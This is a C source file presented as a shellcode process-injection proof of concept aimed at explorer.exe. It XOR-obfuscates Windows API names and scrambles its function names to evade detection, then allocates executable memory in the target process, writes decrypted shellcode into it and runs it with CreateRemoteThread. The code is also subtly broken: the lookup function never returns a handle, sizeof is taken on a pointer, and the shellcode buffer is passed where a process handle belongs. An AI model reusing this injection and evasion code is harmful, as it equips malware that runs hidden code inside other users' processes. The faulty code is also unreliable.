/*
    Author:    lemur
    GitHub:    https://github.com/1emvr
    Email:     1emvr@protonmail.com
    Date:      01/08/2023   11:46 AM

    ShellCode process injection proof of concept (calc.exe)
    Definitions/Prototypes: https://learn.microsoft.com/en-us/windows/win32/api

*/
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <synchapi.h>
#include <stdio.h>
#include <stdlib.h>

#include <cstdint>
#include "carbon_b.h"

typedef LPVOID(WINAPI *VirtualAllocEx_t)(
   
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);
typedef BOOL(WINAPI *WriteProcessMemory_t)(
    
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);
typedef HANDLE(WINAPI *CreateRemoteThread_t)(
    
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);
typedef DWORD(NTAPI *NtDelayExecution_t)(
        
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval
);

HANDLE KdciYl_jhy__bnh__(u_char processName[]) {
/*
    Taking in processName as an argument from main.

    Creating a snapshot of the specified process.
    If there's not a valid handle value for explorer.exe then we return zero and main exits quietly.

    We check our snapshot for the first process found, mapped to the processListEntry address.
    We continnue looking at each process and if we indeed have a match for the desired process (explorer.exe) then we nab the process Id.
*/
    int pid = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    PROCESSENTRY32 processListEntry;
    processListEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processListEntry)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    while (Process32Next(hSnapshot, &processListEntry)) {
        if (lstrcmpiA((LPCSTR)processName, (LPCSTR)processListEntry.szExeFile) == 0) {
            pid = processListEntry.th32ProcessID;
            break;
        }
    }
}

char VA_Ng_Zh___(char *data, int datalen, u_char *key, int keylen) {

    int j = 0;

    for (int i = 0; i < datalen; i++) {
        if (j == keylen - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
    return *data;
}

int Dcghny_ltabli(HANDLE hProcess, char *_LTABLI, u_int TableSize) {
/*
    API/Syscall Prototypes:

        DWORD NtDelayExecution(
           [in] BOOLEAN              Alertable,
           [in] PLARGE_INTEGER       DelayInterval 
        );

        LPVOID VirtualAllocEx(
           [in]           HANDLE hProcess,
           [in, optional] LPVOID lpAddress,
           [in]           SIZE_T dwSize,
           [in]           DWORD  flAllocationType,
           [in]           DWORD  flProtect
        );

         BOOL WriteProcessMemory(
           [in]  HANDLE  hProcess,
           [in]  LPVOID  lpBaseAddress,
           [in]  LPCVOID lpBuffer,
           [in]  SIZE_T  nSize,
           [out] SIZE_T  *lpNumberOfBytesWritten
        );

         HANDLE CreateRemoteThread(
           [in]  HANDLE                 hProcess,
           [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
           [in]  SIZE_T                 dwStackSize,
           [in]  LPTHREAD_START_ROUTINE lpStartAddress,
           [in]  LPVOID                 lpParameter,
           [in]  DWORD                  dwCreationFlags,
           [out] LPDWORD                lpThreadId
        );

    All API/System calls are obfuscated by indirectly defining them from their prototypes
    and obfuscating strings used to get process addresses for said calls, using a XOR cipher
    to decrypt the obfuscated values.

*/
    VA_Ng_Zh___(sNtDelayExecutionXORed, sizeof(sNtDelayExecutionXORed), UB_fht, sizeof(UB_fht));
    NtDelayExecution_t pNtDelayExecution = (NtDelayExecution_t)GetProcAddress(GetModuleHandle((LPCWSTR)"ntdll.dll"), sNtDelayExecutionXORed);
    pNtDelayExecution(NULL, (PLARGE_INTEGER)10000);

    // Allocate shellcode memory for remote shell variable and ready to pass to remote thread
    LPVOID pRemoteShellcode = NULL;
    VA_Ng_Zh___(sVirtualAllocExXORed, sizeof(sVirtualAllocExXORed), UB_fht, sizeof(UB_fht));
    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), sVirtualAllocExXORed);
    pRemoteShellcode = pVirtualAllocEx(_LTABLI, NULL, TableSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    
    VA_Ng_Zh___(sWriteProcessMemoryXORed, sizeof(sWriteProcessMemoryXORed), UB_fht, sizeof(UB_fht));
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), sWriteProcessMemoryXORed);
    VA_Ng_Zh___(_LTABLI, sizeof(_LTABLI), UB_fht, sizeof(UB_fht));
    pWriteProcessMemory(hProcess, pRemoteShellcode, _LTABLI, sizeof(_LTABLI), NULL);

    VA_Ng_Zh___(sCreateRemoteThreadXORed, sizeof(sCreateRemoteThreadXORed), UB_fht, sizeof(UB_fht));
    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), sCreateRemoteThreadXORed);

    HANDLE hThread = NULL;
    hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 10500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR LpCmdLine, int nCmdShow) {
/*
    Call on the Process Snapshot function in search of "explorer.exe",
    passing off the return to the handler.

    If the process is found in the handle, 
    jump to the memory allocation/thread handling function.
*/
    HANDLE hProcess = NULL;
    u_char name[] = "explorer.exe";
    u_int TableSize = sizeof(_LTABLI);

    hProcess = KdciYl_jhy__bnh__(name);

    if (hProcess != NULL) {
        Dcghny_ltabli(hProcess, _LTABLI, TableSize);
        CloseHandle(hProcess);
    }
    return 0;
}